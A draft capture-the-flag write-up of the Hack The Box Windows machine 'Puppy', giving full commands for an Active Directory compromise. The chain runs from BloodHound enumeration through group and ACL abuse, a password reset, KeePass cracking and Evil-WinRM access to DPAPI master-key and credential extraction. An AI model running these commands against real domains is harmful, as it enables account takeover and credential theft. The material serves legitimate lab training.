---
title: "HTB: Puppy"
date: 2025-05-21
excerpt: Puppy is a Windows machine that simulates a real life pentest scenario. Credentials are provided.
readingTime: 10
tags:
  - HTB
  - Writeup
  - Medium
  - Windows
  - bloodhound
  - bloodyAD
  - impacket
  - evil-winrm
  - winrm
  - smb
  - dpapi
  - credentials
author: pir4cy
coverImage: /images/htb/covers/puppy-cover.png
draft: true
---

# Puppy

> **TL;DR:**
> 
> - Start with provided credentials (`levi.james:KingofAkron2025!`) and enumerate with nmap, netexec, and BloodHound.
> - Abuse `GenericWrite` on Developers group to access DEV share and extract a KeePass database.
> - Crack KeePass DB with keepass4brute to get new credentials (`ant.edwards:Antman2025!`).
> - Use new creds to gain `GenericAll` on `adam.silver`, reset password, and enable account with bloodyAD.
> - Use Evil-WinRM for shell as `adam.silver`, find backup files, and extract more credentials (`steph.cooper:ChefSteph2025!`).
> - Dump DPAPI master key and credential blob, then decrypt with impacket-dpapi and HackTricks guidance to get admin creds.
> - Use admin creds to grab the root flag. 
> 
> **Conclusion:**
> This box was a realistic and layered Windows pentest scenario, requiring a variety of tools and techniques. Enumeration, privilege escalation, and credential extraction were all key. The box was straightforward but challenging, and provided a great learning experience. Rating: 4.9/5.

Puppy is a medium difficulty Windows box that drops you into a pentester's role with credentials for a user.

We have the credentials for an account: levi.james / KingofAkron2025!

## Info  
  * IP: 10.10.11.70
  * OS: Windows
  * Difficulty: Hard
  * Initial credentials: `levi.james:KingofAkron2025!`
## Initial Scan

As always, we start with an nmap scan - 
![Nmap Scan](/images/htb/machines/Puppy/nmap.png "NMAP")

Looks like a pretty standard Domain Controller. Let's add this DC at the end of our hosts file.
```
10.10.11.70 dc.puppy.htb
```

## Enumeration
With the provided credentials, we can test to see what we can access. We can test this using [netexec](https://www.netexec.wiki/) - `nxc`.

A quick check using the wmi mode shows that our credentials are valid - 
```
nxc wmi dc.puppy.htb -u levi.james -p 'KingofAkron2025!'
```

![levi james credentials](/images/htb/machines/Puppy/levi-valid.png)

We can also enumerate any potential file shares for access using - 
```
nxc smb dc.puppy.htb -u levi.james -p 'KingofAkron2025!' --shares
```

![levi-smb-shares](/images/htb/machines/Puppy/levi-smb-shares.png)

Not seeing a lot of access here, let's try bloodhound and see what information we can gather.

We can either use `bloodhound-python` or `nxc ldap` for bloodhound data collection. 

1. For bloodhound-python - `bloodhound-python -d PUPPY.HTB -u levi.james -p "KingofAkron2025!" -gc dc.puppy.htb -c all -ns 10.10.11.70`
2. For nxc  - `nxc ldap dc.puppy.htb -u puppy.htb\\levi.james -p 'KingofAkron2025!' --bloodhound --collection All -d PUPPY.HTB --dns-server 10.10.11.70`

![nxc-bloodhound](/images/htb/machines/Puppy/nxc-bloodhound.png)

Either of the methods should provide some collection data that we can then load into Bloodhound.

![bloodhound-ingest](/images/htb/machines/Puppy/bloodhound-upload-files.png)
## Foothold

After Bloodhound ingests all the data that's uploaded, let's take a look and see what we can access with our existing privilege.

![bloodhound-levi](/images/htb/machines/Puppy/bloodhound-levi.png)

We have `GenericWrite` control access on the group Developers. Bloodhound is also nice enough to give us a method to abuse this access.

![bloodhound-write-access](/images/htb/machines/Puppy/bloodhound-write-access.png)

We can abuse this access to add our user (levi.james) to the Developers group.
```
net rpc group addmem "Developers" "levi.james" -U "puppy.htb"/"levi.james"%'KingofAkron2025!' -S "dc.puppy.htb"
```

Now we should have access to the DEV share we discovered during our enumeration.
![levi-dev-share](/images/htb/machines/Puppy/levi-dev-share.png)

We can continue to use nxc to get this data by using - 
```
nxc smb dc.puppy.htb -u 'levi.james' -p 'KingofAkron2025!' -M spider_plus -o DOWNLOAD_FLAG=True
```

The DEV share has an interesting file called `recovery.kdbx`. KDBX is used for KeePass's database. Ref - https://keepass.info/help/kb/kdbx_4.html 

We may be able to extract some credentials from this database file.

![KeePass Locked - Big F](/images/htb/machines/Puppy/kdbx-locked-sadge.png)

I tried using `keepass2john` to bruteforce the password but sadly, John does not support the 4.x format :(
![no john support](/images/htb/machines/Puppy/keepass2john-fail.png)

I ended up finding a github script to crack the 4.x hash - https://github.com/r3nt0n/keepass4brute 
```
./keepass4brute.sh ~/puppy-htb/recovery.kdbx /usr/share/wordlists/rockyou.txt
```
Let's see what we get  - 
![keepass4brute-success](/images/htb/machines/Puppy/keepass4brute-success.png)

Gotta love the weak password for password manager. Using the acquired password, we are able to view the database - 
![keepass-expose](/images/htb/machines/Puppy/keepass-expose.png)


#### Current Loot
- Usernames - we can grab the entire list of users from bloodhound directly
![bloodhound-users](/images/htb/machines/Puppy/bloodhound-all-users.png)
- Passwords - including our credentials and the ones we grabbed from the database
![loot-captured-1](/images/htb/machines/Puppy/loot-foothold.png)

Before we move on, let's test these credentials to see if we get any sort of access.
![ant.edward credential](/images/htb/machines/Puppy/ant-edwards-valid-cred.png)

Looks like we only have 1 valid credential - `ant.edwards:Antman2025!`

maybe a gif of cleaning up sheepishly?
## User
Going back to bloodhound, we can run nxc again to update our bloodhound data and gather any new data that we can
```
nxc ldap dc.puppy.htb -u puppy.htb\\ant.edwards -p 'Antman2025!' --bloodhound --collection All -d PUPPY.HTB --dns-server 10.10.11.70
```

We can then re-upload the extracted data, which should be relatively quicker than the first time around.

Now let's see what permissions we get using `ant.edwards` account.
![bloodhound ant edwards](/images/htb/machines/Puppy/bloodhound-ant.png)

Similar to our initial Foothold, we see that `ant` has *GenericAll* permissions for `Adam.Silver` account - full control of the user allows us to modify properties of the user as needed.

Bloodhound is nice enough to give us methods to abuse this as well :) Let's change the user's password using the recommended command - 
```
 net rpc password "adam.silver" 'pir4cy1sc00l!' -U "puppy.htb"/"ant.edwards"%'Antman2025!' -S "dc.puppy.htb"
```

Another roadblock that comes up is that Adam's account is currently disabled. We can use a nifty tool here called `bloodyAD` to change that - 
```
bloodyAD --host 10.10.11.70 -d PUPPY.HTB -u ant.edwards -p 'Antman2025!' remove uac adam.silver -f ACCOUNTDISABLE
```

![bloodyAD](/images/htb/machines/Puppy/bloodyAD-account-enable.png)

Now we should have access to `adam.silver`'s account. 
![adam silver owned](/images/htb/machines/Puppy/adam-silver-owned.png)

Let's update this on bloodhound and see what we can get from Adam's account.
![adam remote access](/images/htb/machines/Puppy/adam-silver-access.png)

Testing credentials with `nxc winrm` mode.
![nxc winrm](/images/htb/machines/Puppy/adam-silver-nxc-winrm.png)

Now we can launch `evil-winrm` and get our flag - 
```
evil-winrm -i dc.puppy.htb -u 'adam.silver' -p 'pir4cy1sc00l!'
```


![user pwn](/images/htb/machines/Puppy/user-pwned.png)


## Privilege Escalation
With our newfound privileges, we can snoop around and enumerate the file system as much as possible. 

Browsing through, we see a *Backups* folder that contains a zip file. We can download this file using Evil-WinRM's `download` option and open it up on our local machine.
![backup files found](/images/htb/machines/Puppy/backup-exposed.png)

After extracting the files from the backup, there is an interesting file `nms-auth-config.xml.bak`. 
This file provides us with additional credentials as well -
![steph-cooper-pwn](/images/htb/machines/Puppy/steph-cooper-password.png)

- New credentials: `steph.cooper:ChefSteph2025!`

Testing it out with nxc again - 
![steph cooper owned](/images/htb/machines/Puppy/steph-cooper-owned.png)

Based on what we have seen so far, `Steph Cooper` has 2 accounts - 
- Mortal Account - `steph.cooper:ChefSteph2025!`
- Admin Account - `steph.cooper_adm`

With our current terminal access, we can move on to attempting to searches for DPAPI credentials. If we can get the credentials and master key, we can attempt to decrypt and get plaintext credentials to move further.

### Grabbing DPAPI Master Key

We can look for these sensitive files in the following directories - 
```
Get-ChildItem C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\steph.cooper\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\
Get-ChildItem -Hidden C:\Users\steph.cooper\AppData\Local\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\
```

In our case, the file exists in `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\`

You can use `ls -Hidden` to review the files as needed. Once you have access to the master key, you can copy it over to your local host

```
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

We can then use the following command to decode the resulting base64 on the host.
```
echo "{base64 of master key}" | base64 -d > master.key
```

### Grabbing DPAPI Encrypted Files
These **protected files** for common users are in:

- `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Vault\*`
- Check also changing `\Roaming\` to `\Local\` in the above paths.

In our case, the file reside in `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\`

Similar to the last section, we can utilize the base64 method to export this credential file.
![dpapi cred files](/images/htb/machines/Puppy/dpapi-creds-transfer.png)


## Root
With the master key and credential file added to our loot, we can attempt to crack these credentials to see if anything juicy comes out.

To achieve this, we can use ImPacket's dpapi.py. This can be directly accessed in Kali Linux using `impacket-dpapi`.  This will require 2 steps - 
1. Cracking the master key.
2. Decrypting the credential file.

### Cracking the Master Key
We can crack the master key using the following command - 
```
impacket-dpapi masterkey -file master.key -t puppy.htb/steph.cooper:'ChefSteph2025!'@dc.puppy.htb
```

This will generate the decrypted key, which we can then use for the next step.
![dpapi decrypted](/images/htb/machines/Puppy/dpapi-decrypted-key.png)

### Decrypting the Credential
With the cracked key, we can now proceed to decrypt the credential we extracted from the target.
Using impacket-dpapi again, we can decrypt the credential as well.
```
impacket-dpapi credential -file credential -key '0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84'
```

At last, we receive credentials for `steph.cooper_adm`
![steph cooper adm](/images/htb/machines/Puppy/dpapi-creds-cracked.png)

We can now use these to grab the root flag from `C:\Users\Administrator\Desktop`

### Rooted
![Pwned](/images/htb/machines/Puppy/puppy-pwnd.png)

## Conclusion
At last, we got the root flag. I loved this box due to it's realism. It was a great experience and we ended up using a bunch of different tools and methodologies that I had not explored. 

Overall, I'd concur with the box's rating of 4.9/5 as there was little to complain about, the box was pretty straightforward with some layers baked in.

## References
- [netexec (nxc)](https://www.netexec.wiki/)
- [bloodhound-python](https://github.com/fox-it/BloodHound.py)
- [BloodHound](https://bloodhound.readthedocs.io/)
- [keepass2john](https://www.openwall.com/john/)
- [keepass4brute](https://github.com/r3nt0n/keepass4brute)
- [John the Ripper](https://www.openwall.com/john/)
- [bloodyAD](https://github.com/CravateRouge/bloodyAD)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Impacket (dpapi.py)](https://github.com/fortra/impacket)
- [KeePass KDBX 4.x Format](https://keepass.info/help/kb/kdbx_4.html)
- [DPAPI Extraction (HackTricks)](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/dpapi-extracting-passwords.html)
